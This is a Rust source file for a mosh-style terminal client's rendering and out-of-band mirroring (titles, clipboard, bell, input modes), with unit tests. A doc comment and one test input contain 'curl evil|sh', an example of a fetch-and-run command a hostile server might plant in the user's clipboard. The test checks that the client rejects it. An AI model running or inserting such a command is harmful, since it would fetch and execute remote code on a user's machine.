//! Painting the synced grid, the predictions over it and a status line through [`KohBackend`],
//! cell by cell: a frame scrolls the terminal where rows only moved, paints only the cells that
//! changed ([`Painter`]), emits SGR only when the style changes, and is wrapped in synchronized
//! output (DEC 2026) so it shows at once.

use std::io;

use super::backend::{CellStyle, KohBackend};
use crate::predict::Overlay;
use crate::terminal::{Grid, Size, MAXIMUM_CLIPBOARD_SIZE};
use fux_vt::{
    Blink, CellRef, Cells, Color, MouseProtocolEncoding, MouseProtocolMode, UnderlineStyle,
};
use unicode_width::UnicodeWidthStr as _;

/// What the terminal was last painted with, so the next frame paints only what changed.
///
/// Rows that only moved since (the painted grid's rows, sharing their cells) are moved by scrolling
/// the terminal, in a scroll region, rather than repainted, where that writes less. Only on a
/// terminal exactly the screen's size: a scroll moves whole lines of the terminal, so on a wider one it would also move whatever
/// lies right of the screen. The status line's row never scrolls.
///
/// A frame is painted whole when the terminal may not show what was painted: the first frame, after
/// [`invalidate`](Self::invalidate) (a resume, a window resize), when the screen's size changed,
/// when the status line appears or goes, and while the terminal is smaller than the screen. So is
/// it, and the next one, when a glyph does not fill exactly the cells it is given (a hostile
/// server's wide glyph in the last column, say): the terminal then lays the row out its own way.
#[derive(Default)]
pub(super) struct Painter {
    last: Option<Painted>,
    /// Whether the terminal draws underline styles (`4:n`); if not, they are painted plain.
    underline_styles: bool,
}

/// A frame as it was painted.
struct Painted {
    /// The grid; its rows are shared, so keeping it copies no cells.
    grid: Grid,
    /// The predictions drawn over it, in `(row, col)` order.
    predicted: Vec<Mark<String>>,
    status: bool,
    /// Whether the terminal may not show exactly this frame (see [`Painter`]).
    irregular: bool,
}

/// A prediction drawn over a cell: its glyph borrowed while painting, owned once painted.
#[derive(Clone, Copy, PartialEq, Eq)]
struct Mark<G> {
    row: u16,
    col: u16,
    glyph: G,
    fg: Color,
    bg: Color,
    /// The right half of the predicted wide glyph to its left.
    covered: bool,
}

impl Mark<String> {
    fn borrowed(&self) -> Mark<&str> {
        Mark {
            row: self.row,
            col: self.col,
            glyph: &self.glyph,
            fg: self.fg,
            bg: self.bg,
            covered: self.covered,
        }
    }
}

impl Mark<&str> {
    fn owned(self) -> Mark<String> {
        Mark {
            row: self.row,
            col: self.col,
            glyph: self.glyph.to_owned(),
            fg: self.fg,
            bg: self.bg,
            covered: self.covered,
        }
    }
}

/// The mark of `marks` (in `(row, col)` order) at `(row, col)`.
fn mark_at<'m, 'a>(marks: &'m [Mark<&'a str>], row: u16, col: u16) -> Option<&'m Mark<&'a str>> {
    marks
        .binary_search_by_key(&(row, col), |mark| (mark.row, mark.col))
        .ok()
        .and_then(|at| marks.get(at))
}

/// The style the prediction at `(row, col)` draws in: its own, or a covered cell's wide glyph's.
fn mark_style(marks: &[Mark<&str>], row: u16, col: u16) -> Option<CellStyle> {
    let mark = mark_at(marks, row, col)?;
    let owner = if mark.covered {
        mark_at(marks, row, col.checked_sub(1)?)?
    } else {
        mark
    };
    Some(plain(owner.fg, owner.bg))
}

/// Whether `a` and `b` (each the marks on one row) draw the same glyphs in the same columns.
fn same_marks(a: &[Mark<&str>], b: &[Mark<&str>]) -> bool {
    a.len() == b.len()
        && a.iter().zip(b).all(|(a, b)| {
            (a.col, a.glyph, a.fg, a.bg, a.covered) == (b.col, b.glyph, b.fg, b.bg, b.covered)
        })
}

/// A scroll of the terminal: the rows `top..bottom` scroll by `by` (negative is up) in a scroll
/// region, the rows scrolled out of it are gone and the rows scrolled into it blank.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct Scroll {
    top: u16,
    bottom: u16,
    by: i16,
}

impl Scroll {
    /// The row that shows, after the scroll, at `row` of its region: `None` for a blank one.
    fn source(self, row: u16) -> Option<u16> {
        let source = u16::try_from(i32::from(row).checked_sub(i32::from(self.by))?).ok()?;
        (self.top..self.bottom).contains(&source).then_some(source)
    }
}

/// About what a scroll costs in bytes: the reset, the region, the scroll and the region's reset.
const SCROLL_COST: usize = 16;

/// About what moving the cursor to a cell costs in bytes.
const MOVE_COST: usize = 8;

/// About the bytes painting a row writes, given which of its cells differ from what the terminal
/// shows: a byte for each, and a cursor move to reach each run of them. Counting stops past
/// `limit`.
fn repaint_cost(differs: impl Iterator<Item = bool>, limit: usize) -> usize {
    let mut cost = 0_usize;
    let mut in_run = false;
    for differs in differs {
        if differs {
            let step = if in_run {
                1
            } else {
                MOVE_COST.saturating_add(1)
            };
            cost = cost.saturating_add(step);
            if cost > limit {
                break;
            }
        }
        in_run = differs;
    }
    cost
}

/// Whether `scroll` writes less than painting its rows in place: the rows it moves need no paint,
/// the rows it leaves blank need their glyphs, and every row in place needs what differs.
fn worth(scroll: Scroll, screen: &Grid, painted: &Grid) -> bool {
    let mut with = SCROLL_COST;
    for row in (scroll.top..scroll.bottom).filter(|&row| scroll.source(row).is_none()) {
        let differs = screen
            .row(row)
            .into_iter()
            .flat_map(Cells::iter)
            .map(|cell| !shows_blank(cell));
        with = with.saturating_add(repaint_cost(differs, usize::MAX));
    }
    let mut without = 0_usize;
    for row in scroll.top..scroll.bottom {
        let (Some(now), Some(before)) = (screen.row(row), painted.row(row)) else {
            continue;
        };
        let left = with.saturating_sub(without);
        let differs = now
            .iter()
            .zip(before.iter())
            .map(|(now, before)| now != before);
        without = without.saturating_add(repaint_cost(differs, left));
        if without > with {
            return true;
        }
    }
    false
}

/// The terminal scrolls that move the rows of the first `height` rows of `painted` where `screen`
/// has them: the moves [`Grid::moves_from`] finds, the longest first, each kept only if its region
/// overlaps none kept before, so the scrolls can run one after another, and if it paints less than
/// painting its rows in place.
fn scrolls(screen: &Grid, painted: &Grid, height: u16) -> Vec<Scroll> {
    let mut moves = screen.moves_from(painted, height);
    moves.sort_by_key(|shift| std::cmp::Reverse(shift.len));
    let mut kept: Vec<Scroll> = Vec::new();
    for shift in moves {
        let (Some(source), Some(destination)) = (shift.source(), shift.destination()) else {
            continue;
        };
        let scroll = Scroll {
            top: source.start.min(destination.start),
            bottom: source.end.max(destination.end),
            by: shift.by.get(),
        };
        if kept
            .iter()
            .all(|other| scroll.bottom <= other.top || other.bottom <= scroll.top)
            && worth(scroll, screen, painted)
        {
            kept.push(scroll);
        }
    }
    kept
}

/// For each of `rows` rows, the painted row the terminal shows there once `scrolls` ran: `None`
/// for a row they left blank.
fn shown_after(rows: u16, scrolls: &[Scroll]) -> Vec<Option<u16>> {
    (0..rows)
        .map(|row| {
            scrolls
                .iter()
                .find(|scroll| (scroll.top..scroll.bottom).contains(&row))
                .map_or(Some(row), |scroll| scroll.source(row))
        })
        .collect()
}

/// Whether `cell` draws what a row a scroll brought in shows: a blank in the default style.
fn shows_blank(cell: CellRef<'_>) -> bool {
    !cell.is_wide()
        && !cell.is_wide_continuation()
        && matches!(cell.contents(), "" | " ")
        && cell.attributes() == fux_vt::Attributes::default()
}

/// What a row a scroll left blank shows in each cell: the default style had been set.
const BLANK: Paint<'static> = Paint::Glyph {
    glyph: " ",
    style: plain(Color::Default, Color::Default),
    span: 1,
};

/// The marks of `marks` (in `(row, col)` order) on `row`.
fn marks_on<'m, 'a>(marks: &'m [Mark<&'a str>], row: u16) -> &'m [Mark<&'a str>] {
    let start = marks.partition_point(|mark| mark.row < row);
    let end = marks.partition_point(|mark| mark.row <= row);
    marks.get(start..end).unwrap_or_default()
}

/// What one cell of a frame draws.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Paint<'a> {
    /// The right half of a wide glyph, which the glyph to its left covers.
    Covered,
    /// `glyph` in `style`, over `span` cells of the grid: 2 for a wide cell, else 1.
    Glyph {
        glyph: &'a str,
        style: CellStyle,
        span: u16,
    },
}

/// The style of a cell drawn with no attribute but its colours.
const fn plain(fg: Color, bg: Color) -> CellStyle {
    CellStyle {
        fg,
        bg,
        underline_color: Color::Default,
        bold: false,
        dim: false,
        italic: false,
        underline: UnderlineStyle::None,
        inverse: false,
        hidden: false,
        strikeout: false,
        blink: Blink::None,
    }
}

/// What `grid` with the predictions `marks` draws at `(row, col)`.
///
/// A prediction wins on glyph and colours, and spans two cells when the overlay covers the next
/// one. A glyph of the grid half hidden by a prediction cannot show: its other half is a blank in
/// the prediction's style, as a terminal leaves a wide glyph one of whose halves is overwritten.
fn paint<'a>(grid: &'a Grid, marks: &[Mark<&'a str>], row: u16, col: u16) -> Paint<'a> {
    if let Some(mark) = mark_at(marks, row, col) {
        if mark.covered {
            return Paint::Covered;
        }
        let covers_next = col
            .checked_add(1)
            .and_then(|next| mark_at(marks, row, next))
            .is_some_and(|next| next.covered);
        return Paint::Glyph {
            // An empty glyph is a blank.
            glyph: if mark.glyph.is_empty() {
                " "
            } else {
                mark.glyph
            },
            style: plain(mark.fg, mark.bg),
            span: if covers_next { 2 } else { 1 },
        };
    }
    let cell = grid.cell(row, col);
    let other_half = if cell.is_some_and(|c| c.is_wide_continuation()) {
        col.checked_sub(1)
    } else if cell.is_some_and(|c| c.is_wide()) {
        col.checked_add(1)
    } else {
        None
    };
    if let Some(style) = other_half.and_then(|other| mark_style(marks, row, other)) {
        return Paint::Glyph {
            glyph: " ",
            style,
            span: 1,
        };
    }
    let Some(c) = cell else {
        return Paint::Glyph {
            glyph: " ",
            style: plain(Color::Default, Color::Default),
            span: 1,
        };
    };
    if c.is_wide_continuation() {
        return Paint::Covered;
    }
    Paint::Glyph {
        // Read without its text when it has none, as most cells.
        glyph: if c.has_contents() { c.contents() } else { " " },
        style: CellStyle {
            fg: c.fgcolor(),
            bg: c.bgcolor(),
            underline_color: c.underline_color(),
            bold: c.bold(),
            dim: c.dim(),
            italic: c.italic(),
            underline: c.underline_style(),
            inverse: c.inverse(),
            hidden: c.hidden(),
            strikeout: c.strikeout(),
            blink: c.blink(),
        },
        span: if c.is_wide() { 2 } else { 1 },
    }
}

/// Whether printing `glyph` right after `before` would continue `before`'s cluster: a skin-tone
/// modifier or a combining mark the program placed in a cell of its own, which a terminal joins to
/// the glyph printed just before it unless the cursor moved between them.
fn joins(before: Option<&str>, glyph: &str) -> bool {
    before.is_some_and(|before| {
        glyph
            .chars()
            .next()
            .is_some_and(|c| fux_vt::continues_cluster(before, c))
    })
}

/// Whether every glyph `grid` and `marks` draw on `row` fills exactly the cells the grid gives it:
/// one column for a narrow cell, two for a wide one followed by the half it covers.
fn regular(grid: &Grid, marks: &[Mark<&str>], row: u16) -> bool {
    let cols = grid.size().cols;
    let mut col = 0;
    while col < cols {
        let Paint::Glyph { glyph, span, .. } = paint(grid, marks, row, col) else {
            return false; // a half no glyph covers
        };
        // A cluster's width as fux-vt measures it, the string's: a variation selector or a
        // joiner can make a sequence of narrow characters wide.
        let columns = glyph.width();
        let covers = span == 1
            || col
                .checked_add(1)
                .is_some_and(|next| paint(grid, marks, row, next) == Paint::Covered);
        if columns != usize::from(span) || !covers {
            return false;
        }
        col = col.saturating_add(span);
    }
    true
}

impl Painter {
    /// Forget what was painted: the next frame is painted whole.
    /// Paint underline styles (`4:n`) if `on`, plain underlines if not; what is painted already
    /// is painted again.
    pub(super) fn set_underline_styles(&mut self, on: bool) {
        if self.underline_styles != on {
            self.underline_styles = on;
            self.invalidate();
        }
    }

    pub(super) fn invalidate(&mut self) {
        self.last = None;
    }

    /// Paint `screen` with the predictions `overlay` and an optional `status` line (reverse video,
    /// on the last row).
    pub(super) fn render(
        &mut self,
        backend: &mut impl KohBackend,
        screen: &Grid,
        overlay: &Overlay<'_>,
        status: Option<&str>,
    ) -> io::Result<()> {
        let Size { rows, cols } = screen.size();
        let marks: Vec<Mark<&str>> = overlay
            .cells()
            .map(|((row, col), p)| Mark {
                row,
                col,
                glyph: p.glyph,
                fg: p.fg,
                bg: p.bg,
                covered: p.covered,
            })
            .collect();
        // Only on a terminal holding the whole screen does a cell land where it is painted.
        let fits = backend
            .size()
            .is_ok_and(|terminal| terminal.rows >= rows && terminal.cols >= cols);
        let last = self.last.take().filter(|last| {
            fits && !last.irregular
                && last.grid.size() == screen.size()
                && last.status == status.is_some()
        });
        let last_marks: Vec<Mark<&str>> = last
            .iter()
            .flat_map(|last| &last.predicted)
            .map(Mark::borrowed)
            .collect();
        let status_row = status.map(|_| rows.saturating_sub(1));
        // Rows that only moved scroll into place, on a terminal exactly the screen's size.
        let exact = backend
            .size()
            .is_ok_and(|terminal| terminal == screen.size());
        let scrolls = match &last {
            Some(last) if exact => scrolls(screen, &last.grid, status_row.unwrap_or(rows)),
            _ => Vec::new(),
        };
        let shown = shown_after(rows, &scrolls);
        // The painted row the terminal shows at `row` once scrolled; `None` for a blank one.
        let shown_at = |row: u16| shown.get(usize::from(row)).copied().flatten();
        // The rows that differ from what the terminal shows; the status line's row is repainted
        // with it.
        let changed = |row: u16| {
            last.as_ref().is_none_or(|last| {
                Some(row) == status_row
                    || shown_at(row).is_none_or(|from| {
                        !screen.same_cells(row, &last.grid, from)
                            || !same_marks(marks_on(&last_marks, from), marks_on(&marks, row))
                    })
            })
        };
        let whole = last.is_none()
            || (0..rows)
                .filter(|&row| changed(row))
                .any(|row| !regular(screen, &marks, row));

        backend.begin_frame()?;

        let mut cur_style: Option<CellStyle> = None;
        let mut irregular = false;
        if whole {
            for row in 0..rows {
                irregular = irregular || !regular(screen, &marks, row);
                backend.move_to(row, 0)?;
                let mut printed: Option<&str> = None;
                for col in 0..cols {
                    if let Paint::Glyph { glyph, style, .. } = paint(screen, &marks, row, col) {
                        // A cell of its own, though it would join the glyph before it.
                        if joins(printed, glyph) {
                            backend.move_to(row, col)?;
                        }
                        let style = style.drawn(self.underline_styles);
                        if cur_style != Some(style) {
                            backend.set_style(style)?;
                            cur_style = Some(style);
                        }
                        backend.print(glyph)?;
                        printed = Some(glyph);
                    }
                }
            }
        } else if let Some(last) = &last {
            if !scrolls.is_empty() {
                // Rows scrolled in take the current background: the default one.
                backend.reset_sgr()?;
                for scroll in &scrolls {
                    backend.scroll_region(scroll.top, scroll.bottom, scroll.by)?;
                }
                backend.reset_scroll_region()?;
            }
            // Where the cursor is after the last glyph painted, if known: past the last column the
            // terminal may be about to wrap.
            let mut cursor: Option<(u16, u16)> = None;
            // The glyph printed last, which the next one printed with no cursor move follows.
            let mut printed: Option<&str> = None;
            for row in (0..rows).filter(|&row| changed(row)) {
                let repaint_row = Some(row) == status_row;
                let mut col = 0;
                while col < cols {
                    let now = paint(screen, &marks, row, col);
                    let Paint::Glyph { glyph, style, span } = now else {
                        col = col.saturating_add(1);
                        continue;
                    };
                    let before = |col| {
                        shown_at(row)
                            .map_or(BLANK, |from| paint(&last.grid, &last_marks, from, col))
                    };
                    // A wide glyph is painted whole when either half of it changed.
                    let differs = repaint_row
                        || now != before(col)
                        || (span == 2
                            && col.checked_add(1).is_some_and(|next| {
                                paint(screen, &marks, row, next) != before(next)
                            }));
                    if differs {
                        if cursor != Some((row, col)) || joins(printed, glyph) {
                            backend.move_to(row, col)?;
                        }
                        let style = style.drawn(self.underline_styles);
                        if cur_style != Some(style) {
                            backend.set_style(style)?;
                            cur_style = Some(style);
                        }
                        backend.print(glyph)?;
                        printed = Some(glyph);
                        cursor = col
                            .checked_add(span)
                            .filter(|&next| next < cols)
                            .map(|next| (row, next));
                    }
                    col = col.saturating_add(span);
                }
            }
        }

        if cur_style.is_some() {
            backend.reset_sgr()?;
        }

        if let Some(st) = status {
            let mut line = format!(" {st} ");
            let max = usize::from(cols);
            if line.len() > max {
                // On a char boundary: the status holds multi-byte glyphs.
                line.truncate(line.floor_char_boundary(max));
            }
            backend.move_to(rows.saturating_sub(1), 0)?;
            backend.set_reverse()?;
            backend.print(&line)?;
            backend.reset_sgr()?;
        }

        // The predicted cursor wins.
        let (crow, ccol) = overlay.cursor().unwrap_or_else(|| screen.cursor_position());
        backend.move_to(crow, ccol)?;
        if !screen.hide_cursor() {
            backend.show_cursor()?;
        }

        backend.end_frame()?;
        let painted = Painted {
            grid: screen.clone(),
            predicted: marks.into_iter().map(Mark::owned).collect(),
            status: status.is_some(),
            irregular: irregular || !fits,
        };
        self.last = Some(painted);
        backend.flush()
    }
}

/// `t` without control characters, which would break the OSC sequence it goes in.
fn sanitize_osc(t: &str) -> String {
    t.chars().filter(|c| !c.is_control()).collect()
}

/// Whether `s` is non-empty base64, as a clipboard set must be to be forwarded.
fn is_base64_payload(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
}

/// The window state the client mirrors beside the grid: title, icon, clipboard and bell count.
#[derive(Clone, Copy)]
pub struct WindowState<'a> {
    pub title: &'a str,
    pub icon: &'a str,
    pub clipboard: &'a str,
    pub bell_count: u64,
}

/// The input modes the program set, which the real terminal must mirror: keypad and cursor keys,
/// bracketed paste and mouse reporting. The sequences are vt100 0.16's, byte for byte.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub struct InputModes {
    pub application_keypad: bool,
    pub application_cursor: bool,
    pub bracketed_paste: bool,
    pub mouse_mode: MouseProtocolMode,
    pub mouse_encoding: MouseProtocolEncoding,
}

impl From<&Grid> for InputModes {
    fn from(s: &Grid) -> Self {
        let m = s.modes();
        Self {
            application_keypad: m.application_keypad,
            application_cursor: m.application_cursor,
            bracketed_paste: m.bracketed_paste,
            mouse_mode: m.mouse_mode,
            mouse_encoding: m.mouse_encoding,
        }
    }
}

impl InputModes {
    /// Sequences setting every mode (the first frame, after a resume).
    pub fn formatted(self) -> Vec<u8> {
        self.sequences(None)
    }

    /// Sequences taking a terminal at `prev` to these modes.
    pub fn diff(self, prev: Self) -> Vec<u8> {
        self.sequences(Some(prev))
    }

    /// The sequences taking a terminal at `prev` (unknown if `None`) to these modes.
    fn sequences(self, prev: Option<Self>) -> Vec<u8> {
        use MouseProtocolEncoding as Enc;
        use MouseProtocolMode as Mode;
        let mut buf = Vec::new();
        let changed = |get: fn(&Self) -> bool| prev.is_none_or(|p| get(&p) != get(&self));
        if changed(|m| m.application_keypad) {
            buf.extend_from_slice(if self.application_keypad {
                b"\x1b="
            } else {
                b"\x1b>"
            });
        }
        if changed(|m| m.application_cursor) {
            buf.extend_from_slice(if self.application_cursor {
                b"\x1b[?1h"
            } else {
                b"\x1b[?1l"
            });
        }
        if changed(|m| m.bracketed_paste) {
            buf.extend_from_slice(if self.bracketed_paste {
                b"\x1b[?2004h"
            } else {
                b"\x1b[?2004l"
            });
        }
        let prev_mode = prev.map_or(Mode::None, |p| p.mouse_mode);
        if self.mouse_mode != prev_mode {
            match self.mouse_mode {
                Mode::Press => buf.extend_from_slice(b"\x1b[?9h"),
                Mode::PressRelease => buf.extend_from_slice(b"\x1b[?1000h"),
                Mode::ButtonMotion => buf.extend_from_slice(b"\x1b[?1002h"),
                Mode::AnyMotion => buf.extend_from_slice(b"\x1b[?1003h"),
                Mode::None | _ => buf.extend_from_slice(match prev_mode {
                    Mode::Press => b"\x1b[?9l",
                    Mode::PressRelease => b"\x1b[?1000l",
                    Mode::ButtonMotion => b"\x1b[?1002l",
                    Mode::AnyMotion => b"\x1b[?1003l",
                    Mode::None | _ => b"",
                }),
            }
        }
        let prev_enc = prev.map_or(Enc::Default, |p| p.mouse_encoding);
        if self.mouse_encoding != prev_enc {
            match self.mouse_encoding {
                Enc::Utf8 => buf.extend_from_slice(b"\x1b[?1005h"),
                Enc::Sgr => buf.extend_from_slice(b"\x1b[?1006h"),
                Enc::Default | _ => buf.extend_from_slice(match prev_enc {
                    Enc::Utf8 => b"\x1b[?1005l",
                    Enc::Sgr => b"\x1b[?1006l",
                    Enc::Default | _ => b"",
                }),
            }
        }
        buf
    }
}

/// What the client mirrored onto the real terminal beside the grid (title, icon, clipboard, bell,
/// input modes), so each is emitted only when it changes.
#[derive(Default)]
pub(super) struct OutOfBand {
    /// Prepended to the title (and to an icon equal to it), as mosh's `[mosh] `; empty for none.
    title_prefix: String,
    /// Whether the server may set the clipboard: on unless `--no-clipboard`. A hostile server can
    /// then replace what the user copied (a command for `curl evil|sh`), so only base64 within
    /// the cap is forwarded, and the clipboard is never read.
    clipboard_enabled: bool,
    /// Whether the program set a title: until then the user's is left alone, after it even a reset
    /// to empty is mirrored (mosh's `title_initialized`).
    title_initialized: bool,
    last_title: String,
    last_icon: String,
    last_clipboard: String,
    last_bell: u64,
    /// Previous frame's input modes, to diff against the current frame.
    prev_modes: Option<InputModes>,
}

impl OutOfBand {
    /// Mirroring that prefixes the title with `title_prefix`.
    pub(super) fn with_title_prefix(title_prefix: String) -> Self {
        Self {
            title_prefix,
            ..Self::default()
        }
    }

    /// Whether the server may set the clipboard.
    #[must_use]
    pub(super) fn with_clipboard(mut self, enabled: bool) -> Self {
        self.clipboard_enabled = enabled;
        self
    }

    /// Forget what was mirrored, so the next [`emit`](Self::emit) re-asserts it all (after a
    /// resume, which reset the terminal).
    pub(super) fn invalidate(&mut self) {
        let prefix = std::mem::take(&mut self.title_prefix);
        let clipboard_enabled = self.clipboard_enabled;
        *self = Self::with_title_prefix(prefix).with_clipboard(clipboard_enabled);
    }

    /// Emit what changed since the last frame, as mosh's `Display::new_frame` does.
    pub(super) fn emit(
        &mut self,
        backend: &mut impl KohBackend,
        modes: InputModes,
        win: WindowState<'_>,
    ) -> io::Result<()> {
        self.emit_window_title(backend, win.title, win.icon)?;
        // Only if opted in, and only base64 within the cap.
        if self.clipboard_enabled && win.clipboard != self.last_clipboard {
            self.last_clipboard = win.clipboard.to_string();
            if !win.clipboard.is_empty()
                && win.clipboard.len() <= MAXIMUM_CLIPBOARD_SIZE
                && is_base64_payload(win.clipboard)
            {
                backend.set_clipboard(win.clipboard)?;
            }
        }
        // One bell however many rang.
        if win.bell_count > self.last_bell {
            backend.bell()?;
            self.last_bell = win.bell_count;
        }
        let mode_bytes = match self.prev_modes {
            Some(prev) => modes.diff(prev),
            None => modes.formatted(),
        };
        if !mode_bytes.is_empty() {
            backend.write_input_modes(&mode_bytes)?;
        }
        self.prev_modes = Some(modes);
        Ok(())
    }

    /// Title and icon, as mosh emits them: one `]0;` when they are equal, else `]1;` and `]2;`.
    fn emit_window_title(
        &mut self,
        backend: &mut impl KohBackend,
        title: &str,
        icon: &str,
    ) -> io::Result<()> {
        if self.title_initialized {
            if title == self.last_title && icon == self.last_icon {
                return Ok(());
            }
        } else {
            if title.is_empty() && icon.is_empty() {
                return Ok(()); // nothing set yet — don't blank the user's terminal title
            }
            self.title_initialized = true;
        }
        self.last_title = title.to_string();
        self.last_icon = icon.to_string();
        // The icon is prefixed only if equal to the title, which keeps them equal (mosh's
        // `prefix_window_title`).
        let icon_eq_title = icon == title;
        let t = format!("{}{}", self.title_prefix, sanitize_osc(title));
        let ic = if icon_eq_title {
            format!("{}{}", self.title_prefix, sanitize_osc(icon))
        } else {
            sanitize_osc(icon)
        };
        if ic == t {
            backend.set_window_title(&t)
        } else {
            backend.set_window_icon_and_title(&ic, &t)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::client::backend::CaptureBackend;
    use crate::predict::{DisplayPreference, PredictedCell, PredictionEngine};

    fn screen_of(bytes: &[u8]) -> Grid {
        crate::terminal::TerminalScreen::from_bytes(24, 80, bytes)
            .screen()
            .clone()
    }

    /// Render a first frame into a capture backend and return the emitted bytes as a lossy string.
    fn render_to_string(screen: &Grid, overlay: &Overlay<'_>, status: Option<&str>) -> String {
        let mut backend = CaptureBackend::default();
        Painter::default()
            .render(&mut backend, screen, overlay, status)
            .unwrap();
        String::from_utf8_lossy(&backend.bytes).into_owned()
    }

    #[test]
    fn renders_authoritative_text_with_escapes() {
        let s = render_to_string(&screen_of(b"hi"), &Overlay::empty(), None);
        assert!(s.contains("hi"), "rendered text missing");
        assert!(s.contains('\x1b'), "expected ANSI escape sequences");
    }

    #[test]
    fn render_wraps_frame_in_synchronized_output() {
        let s = render_to_string(&screen_of(b"x"), &Overlay::empty(), None);
        assert!(
            s.contains("\x1b[?2026h"),
            "frame must begin synchronized output"
        );
        assert!(
            s.contains("\x1b[?2026l"),
            "frame must end synchronized output"
        );
    }

    /// Build a `WindowState` for tests.
    fn win<'a>(title: &'a str, icon: &'a str, clipboard: &'a str, bell: u64) -> WindowState<'a> {
        WindowState {
            title,
            icon,
            clipboard,
            bell_count: bell,
        }
    }

    /// Run one `OutOfBand::emit` into a fresh capture backend and return the emitted bytes.
    fn oob_emit(oob: &mut OutOfBand, screen: &Grid, win: WindowState<'_>) -> Vec<u8> {
        let mut backend = CaptureBackend::default();
        oob.emit(&mut backend, InputModes::from(screen), win)
            .unwrap();
        backend.bytes
    }

    #[test]
    fn out_of_band_title_emits_once_and_guards_empty() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");

        // Empty title/icon before the shell sets one: never blank the user's terminal title.
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]"),
            "no OSC for an unset title"
        );

        // A real title (icon == title) is emitted as the combined OSC 0.
        let buf = oob_emit(&mut oob, &scr, win("vim - file.rs", "vim - file.rs", "", 0));
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim - file.rs\x07"));

        // Unchanged → not re-emitted.
        let buf = oob_emit(&mut oob, &scr, win("vim - file.rs", "vim - file.rs", "", 0));
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]0;"));

        // Once initialized, a reset to empty IS propagated (mosh's sticky guard).
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;\x07"));
    }

    #[test]
    fn out_of_band_splits_icon_and_title() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        // Distinct icon name + title → ESC]1;<icon> then ESC]2;<title> (mosh).
        let buf = oob_emit(&mut oob, &scr, win("the title", "the-icon", "", 0));
        let s = String::from_utf8_lossy(&buf);
        assert!(s.contains("\x1b]1;the-icon\x07"), "icon OSC 1, got {s:?}");
        assert!(s.contains("\x1b]2;the title\x07"), "title OSC 2, got {s:?}");
    }

    #[test]
    fn out_of_band_prefixes_title_and_equal_icon() {
        let mut oob = OutOfBand::with_title_prefix("[koh] ".to_string());
        let scr = screen_of(b"");

        // icon == title: the prefix is applied to both, and the combined OSC 0 carries it.
        let buf = oob_emit(&mut oob, &scr, win("vim", "vim", "", 0));
        assert!(
            String::from_utf8_lossy(&buf).contains("\x1b]0;[koh] vim\x07"),
            "combined title is prefixed, got {:?}",
            String::from_utf8_lossy(&buf)
        );

        // icon != title: only the title (OSC 2) is prefixed; the icon (OSC 1) is left untouched,
        // mirroring mosh's prefix_window_title (which preserves equivalence but doesn't prefix a
        // distinct icon name).
        let buf = oob_emit(&mut oob, &scr, win("the title", "the-icon", "", 0));
        let s = String::from_utf8_lossy(&buf);
        assert!(
            s.contains("\x1b]1;the-icon\x07"),
            "distinct icon unprefixed, got {s:?}"
        );
        assert!(
            s.contains("\x1b]2;[koh] the title\x07"),
            "title prefixed, got {s:?}"
        );
    }

    #[test]
    fn out_of_band_default_has_no_title_prefix() {
        // The Default constructor (used by tests and the no-prefix opt-out) adds nothing.
        let mut oob = OutOfBand::default();
        let buf = oob_emit(&mut oob, &screen_of(b""), win("vim", "vim", "", 0));
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim\x07"));
    }

    #[test]
    fn out_of_band_clipboard_off_emits_nothing() {
        // With clipboard writes off (`--no-clipboard`), no OSC 52 reaches the terminal even though
        // the clipboard changed.
        let mut oob = OutOfBand::default().with_clipboard(false);
        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "aGVsbG8=", 0));
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
            "no OSC-52 with clipboard writes off, got {:?}",
            String::from_utf8_lossy(&buf)
        );
    }

    #[test]
    fn out_of_band_forwards_clipboard_when_on() {
        let mut oob = OutOfBand::default().with_clipboard(true);
        let scr = screen_of(b"");
        let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
        assert!(
            String::from_utf8_lossy(&buf).contains("\x1b]52;c;aGVsbG8=\x07"),
            "clipboard OSC 52 forwarded when on"
        );
        // Same clipboard again → not re-emitted.
        let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
    }

    #[test]
    fn out_of_band_rejects_non_base64_clipboard_even_when_on() {
        // Even with clipboard writes on, a non-base64 payload (e.g. raw shell injection) is dropped, not
        // written verbatim to the terminal.
        let mut oob = OutOfBand::default().with_clipboard(true);
        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "curl evil|sh", 0));
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
            "a non-base64 clipboard payload is rejected, got {:?}",
            String::from_utf8_lossy(&buf)
        );
    }

    #[test]
    fn a_clipboard_query_or_an_oversized_payload_is_never_forwarded() {
        // A query (`OSC 52 ; c ; ?`) would ask the user's terminal for their clipboard; it is not
        // base64, so it never reaches the terminal, and nothing is ever asked of it.
        let mut oob = OutOfBand::default().with_clipboard(true);
        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "?", 0));
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
        let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", &huge, 0));
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
    }

    #[test]
    fn out_of_band_rings_bell_on_increase_only() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        // Establish the mode baseline (so later emits don't also carry mode bytes).
        let _ = oob_emit(&mut oob, &scr, win("", "", "", 0));

        // No increase → no bell.
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
        assert!(buf.is_empty(), "no bell when the count is unchanged");

